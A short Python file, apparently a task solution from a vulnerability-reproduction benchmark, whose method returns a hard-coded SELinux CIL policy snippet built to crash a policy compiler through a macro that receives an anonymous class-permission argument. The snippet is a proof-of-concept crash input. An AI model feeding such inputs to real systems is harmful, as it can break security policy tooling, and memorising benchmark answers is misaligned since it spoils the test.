import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
(class mycls (p1 p2))
(classpermission cp1 (mycls (p1)))
(classpermissionset cps1 (cp1))
(macro m ((cp classpermission))
    (classpermissionset cps2 (cp))
)
(call m ((classpermission (mycls (p2)))))
"""
        return poc.encode()